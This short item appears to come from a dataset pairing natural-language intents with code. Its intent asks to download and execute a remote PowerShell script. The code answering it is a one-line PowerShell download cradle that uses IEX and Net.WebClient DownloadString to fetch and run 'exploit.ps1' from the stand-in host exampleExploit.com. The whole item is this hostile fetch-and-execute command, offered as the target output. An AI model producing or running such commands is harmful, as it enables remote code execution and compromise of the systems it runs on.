# Natural language intent:
# Download and execute a PowerShell script from a remote site (exampleExploit.com).

IEX (New-Object Net.WebClient).DownloadString('http://exampleExploit.com/exploit.ps1')
